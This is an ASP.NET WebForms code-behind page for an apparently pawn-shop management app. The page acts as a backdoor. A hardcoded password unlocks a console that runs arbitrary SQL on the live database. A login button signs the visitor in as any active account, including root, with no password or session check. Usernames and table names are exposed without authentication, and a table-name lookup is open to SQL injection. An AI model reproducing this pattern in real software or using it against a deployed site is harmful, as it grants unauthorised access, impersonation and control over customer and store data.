using System;
using System.Collections.Generic;
using System.Configuration;
using System.Data;
using System.Data.SqlClient;
using System.Drawing;
using System.Linq;
using System.Web.Script.Services;
using System.Web.Services;
using System.Web.UI;
using System.Web.UI.WebControls;
using Pawn.Authorize;
using Pawn.Core.DataAccess;
using Pawn.Core.DataModel;
using Pawn.Libraries;
using Pawn.Services;
using Pawn.ViewModel.Models;

namespace Translation
{
    public partial class WebForm1 : Page
    {

        protected void Page_Load(object sender, EventArgs e)
        {
            //var db = new dbDataContext();
            //foreach (var item in db.Orders.Where(c => c.IpAddress == "222.252.25.169"))
            //{
            //    db.Orders.DeleteOnSubmit(item);
            //    db.SubmitChanges();
            //    foreach (var item2 in db.OrderDetails.Where(c => c.OrderId == item.Id))
            //    {
            //        db.OrderDetails.DeleteOnSubmit(item2);
            //        db.SubmitChanges();
            //    }
            //}

            if (IsPostBack) return;
            GetName();
            if ((string)Session["ggg"] != "1") return;
            Button2.Visible = false;
            TextBox2.Visible = false;
            lbl.Text = "";
            pll.Visible = true;
            plMd5.Visible = true;
        }


        protected void Button1_Click(object sender, EventArgs e)
        {
            if ((string)Session["ggg"] == "1")
            {
                try
                {
                    var dt = LoadData(TextBox1.Text);
                    grv.DataSource = dt;
                    grv.DataBind();
                    lbl.Text = @"Query executed successfully";
                    rdoSelect.Checked = rdoSelect.Checked;
                    rdoAlter.Checked = rdoAlter.Checked;
                    rdoDelete.Checked = rdoDelete.Checked;
                    rdoUpdate.Checked = rdoUpdate.Checked;
                    lbl.ForeColor = Color.Blue;
                }
                catch (Exception ex)
                {
                    lbl.Text = @"Error: " + ex.Message;
                    lbl.ForeColor = Color.Red;
                    grv.DataSource = "";
                    grv.DataBind();
                }
            }
            else
            {
                lbl.Text = @"Access Denied";
                lbl.ForeColor = Color.Red;
            }

        }

        protected void Button2_Click(object sender, EventArgs e)
        {
            if (TextBox2.Text == @"@Bentic.Vn*")
            {
                Session["ggg"] = "1";
                Button2.Visible = false;
                TextBox2.Visible = false;
                lbl.Text = "";
                pll.Visible = true;
                plMd5.Visible = true;
            }
        }

        public void GetName()
        {

            var dt = LoadData("SELECT TABLE_NAME as Name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' and TABLE_NAME <> 'sysdiagrams' Order by TABLE_NAME");
            ddlDrop.DataSource = dt;
            ddlDrop.DataValueField = "Name";
            ddlDrop.DataBind();
            DropDownList1.DataSource = dt;
            DropDownList1.DataValueField = "Name";
            DropDownList1.DataBind();

            dt = LoadData("select username from Tb_Account where IsDeleted = 0 and IsActive = 1");
            ddlAccount.DataSource = dt;
            ddlAccount.DataValueField = "username";
            ddlAccount.DataBind();
        }

        protected void ddlDrop_OnSelectedIndexChanged(object sender, EventArgs e)
        {
            string ten = ddlDrop.SelectedItem.ToString();
            var dt = LoadData($"SELECT column_name as [Name], upper(data_type) as [Type],is_nullable as [IsNull],character_maximum_length as [Length] FROM   information_schema.columns WHERE  table_name = '{ten}'");
            grvTable.DataSource = dt;
            grvTable.DataBind();
        }

        public string Returnstring()
        {
            string rs = "";
            for (int i = 0; i < grvTable.Rows.Count - 1; i++)
            {
                var chk = (CheckBox)grvTable.Rows[i].FindControl("chk");
                var label = (Label)grvTable.Rows[i].FindControl("Label1");
                var label1 = (Label)grvTable.Rows[i].FindControl("Label2");
                if (chk.Checked)
                {
                    if (rdoSelect.Checked)
                        rs += label.Text + ", ";
                    if (rdoUpdate.Checked)
                        rs += label.Text + " = " + ", ";
                    if (rdoDelete.Checked)
                        rs += label.Text + " = " + "and ";
                    if (rdoAl.Checked)
                        rs += label.Text + " " + label1.Text;
                    if (rdoDrop.Checked)
                        rs += label.Text;

                }
            }
            return rs;
        }

        protected void btnGen_OnClick(object sender, EventArgs e)
        {
            string a = "";
            a += Returnstring();
            if (rdoSelect.Checked)
            {
                if (a == "")
                    a = "*   ";
                else
                {
                    TextBox1.Text = @"Select ";
                    a = Returnstring();
                }
                TextBox1.Text += @" " + a.Substring(0, a.Length - 2) + @" from " + @"[" + ddlDrop.SelectedItem + @"]";
            }
            if (rdoUpdate.Checked)
                TextBox1.Text += @"[" + ddlDrop.SelectedItem + @"]" + @" set " + a.Substring(0, a.Length - 2);
            if (rdoDelete.Checked)
                TextBox1.Text += @"[" + ddlDrop.SelectedItem + @"]" + @" where " + a.Substring(0, a.Length - 4);
            if (rdoAl.Checked)
                TextBox1.Text += @"[" + ddlDrop.SelectedItem + @"]" + @" " + rdoAl.Text + @" column " + a;
            if (rdoDrop.Checked)
                TextBox1.Text += @"[" + ddlDrop.SelectedItem + @"]" + @" " + rdoDrop.Text + @" column " + a;
            if (rdlAdd.Checked)
                TextBox1.Text += @"[" + DropDownList1.SelectedItem + @"]" + @" " + rdlAdd.Text + @" " + txtName.Text + @" " + txtType.Text;

        }

        protected void rdoSelect_OnCheckedChanged(object sender, EventArgs e)
        {
            TextBox1.Text = rdoSelect.Text;
            pl.Visible = true;
            pl2.Visible = false;
            pl3.Visible = false;
            pl4.Visible = false;
            rdoDrop.Checked = false;
            rdoAl.Checked = false;
            rdlAdd.Checked = false;
        }

        protected void rdoUpdate_OnCheckedChanged(object sender, EventArgs e)
        {
            TextBox1.Text = rdoUpdate.Text + @" ";
            pl.Visible = true;
            pl2.Visible = false;
            pl3.Visible = false;
            pl4.Visible = false;
            rdoDrop.Checked = false;
            rdoAl.Checked = false;
            rdlAdd.Checked = false;
        }

        protected void rdoDelete_OnCheckedChanged(object sender, EventArgs e)
        {
            TextBox1.Text = rdoDelete.Text + @" from ";
            pl.Visible = true;
            pl2.Visible = false;
            pl3.Visible = false;
            pl4.Visible = false;
            rdoDrop.Checked = false;
            rdoAl.Checked = false;
            rdlAdd.Checked = false;
        }

        protected void rdoAlter_OnCheckedChanged(object sender, EventArgs e)
        {
            TextBox1.Text = rdoAlter.Text + @" table ";
            pl.Visible = false;
            pl2.Visible = false;
            pl3.Visible = true;
            pl4.Visible = false;
        }

        protected void reset_OnClick(object sender, EventArgs e)
        {
            TextBox1.Text = "";
            rdoSelect.Checked = false;
            rdoAlter.Checked = false;
            rdoDelete.Checked = false;
            rdoUpdate.Checked = false;
        }

        protected void rdoAl_OnCheckedChanged(object sender, EventArgs e)
        {
            pl.Visible = true;
            pl2.Visible = false;
            pl4.Visible = false;
        }

        protected void rdlAdd_OnCheckedChanged(object sender, EventArgs e)
        {
            pl2.Visible = true;
            pl.Visible = false;
            pl4.Visible = true;
            TextBox1.Text = @"Alter table ";
        }

        protected void rdoDrop_OnCheckedChanged(object sender, EventArgs e)
        {
            pl.Visible = true;
            pl2.Visible = false;
            pl4.Visible = false;
        }

        protected void btnGenMd5_OnClick(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtMd5.Text))
                lbl.Text = @"Bạn chưa nhập chuỗi cần mã hóa";
            else
            {
                lblMd5.Text = Encryption.Md5Encryption(txtMd5.Text);
            }
        }

        [ScriptMethod(ResponseFormat = ResponseFormat.Json)]
        [WebMethod]
        public static string GenMd5(string txt)
        {
            if (string.IsNullOrEmpty(txt))
                return "";
            return Encryption.Md5Encryption(txt);
        }

        protected void btnCopy_OnClick(object sender, EventArgs e)
        {
            
        }
        //protected void btnK_OnServerClick(object sender, EventArgs e)
        //{

        //    var db = new dbDataContext();
        //    var source = db.SouceLanguages.Select(c => c);
        //    foreach (var item in source)
        //    {
        //        foreach (var item2 in source)
        //        {
        //            var tar = new TargetLanguage
        //            {
        //                CreatedOn = DateTime.Now,
        //                SouceLaguageId = item.Id,
        //                TargetLaguageId = item2.Id,
        //                Price = 250,
        //                IsEnable = true
        //            };
        //            db.TargetLanguages.InsertOnSubmit(tar);
        //            db.SubmitChanges();
        //        }
        //    }
        //}
        private DataTable LoadData(string strSql)
        {
            var dt = new DataTable();
            string _connection = new UnitOfWork().GetConnectionString();
            var connection = new SqlConnection(_connection);
            var da = new SqlDataAdapter(strSql, connection);
            da.Fill(dt);
            return dt;
        }

        protected void btnLogin_Click(object sender, EventArgs e)
        {
            try
            {
                var _unitOfWork = new UnitOfWork();
                var account = _unitOfWork.AccountRepository.Filter(s => s.Username == ddlAccount.SelectedItem.Text
                                                                            && s.IsActive && !s.IsDeleted)
                                                                 .Select(s => new AccountModels
                                                                 {
                                                                     Address = s.Address,
                                                                     Avatar = s.Avatar,
                                                                     Birthday = s.Birthday,
                                                                     CreatedDate = s.CreatedDate,
                                                                     CreatedUser = s.CreatedUser,
                                                                     Email = s.Email,
                                                                     Firstname = s.Firstname,
                                                                     Gender = s.Gender,
                                                                     Id = s.Id,
                                                                     Lastname = s.Lastname,
                                                                     Username = s.Username,
                                                                     Phone = s.Phone
                                                                 }).FirstOrDefault();
                if (account != null)
                {
                    var lstRoleId = _unitOfWork.UserRoleRepository.Filter(s => s.AccountId == account.Id).Select(s => s.RoleId).ToList();
                    account.ListRole = lstRoleId;

                    if (lstRoleId.Contains(RoleEnum.Root))
                    {
                        var lstStore = _unitOfWork.StoreRepository.GetAllData().Select(s => new PawnStoreModels
                        {
                            Address = s.Address,
                            Id = s.Id,
                            Name = s.Name,
                            OwnerName = s.OwnerName,
                            Phone = s.Phone
                        }).ToList();
                        account.ListStores = lstStore;
                        account.Store = account.ListStores.OrderBy(s => s.Id).FirstOrDefault();
                        Session[Constants.isRoot] = true;
                    }
                    else
                    {
                        account.ListStores = GetListStoreByUser(account.Id);
                        var objStore = account.ListStores.OrderBy(s => s.Id).FirstOrDefault();
                        account.Store = objStore;
                    }
                    RDAuthorize.Set(account);
                    lblResult.Text = "Login Successfully";
                    lblResult.ForeColor = Color.Blue;
                }else
                {
                    lblResult.Text = "Login Faile";
                    lblResult.ForeColor = Color.Red;
                }
            }
            catch (Exception ex)
            {
                lblResult.Text = "Login Faile " + ex.Message;
                lblResult.ForeColor = Color.Red;
                throw;
            }
        }

        public List<PawnStoreModels> GetListStoreByUser(int userId)
        {
            var _unitOfWork = new UnitOfWork();
            try
            {
                var storeAccountList = _unitOfWork.StoreAccountRepository.Filter(s => s.AccountId == userId);
                var storeList = _unitOfWork.StoreRepository.GetAllData();
                var storeModel = storeList.Join(storeAccountList,
                    m => m.Id,
                    n => n.StoreId,
                    (m, n) => new { m }).Select(m => m.m).Select(s => new PawnStoreModels
                    {
                        Address = s.Address,
                        Id = s.Id,
                        Name = s.Name,
                        OwnerName = s.OwnerName,
                        Phone = s.Phone
                    }).ToList();
                return storeModel;
            }
            catch (Exception ex)
            {
                return null;
            }
        }

        protected void ddlAccount_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
    }
}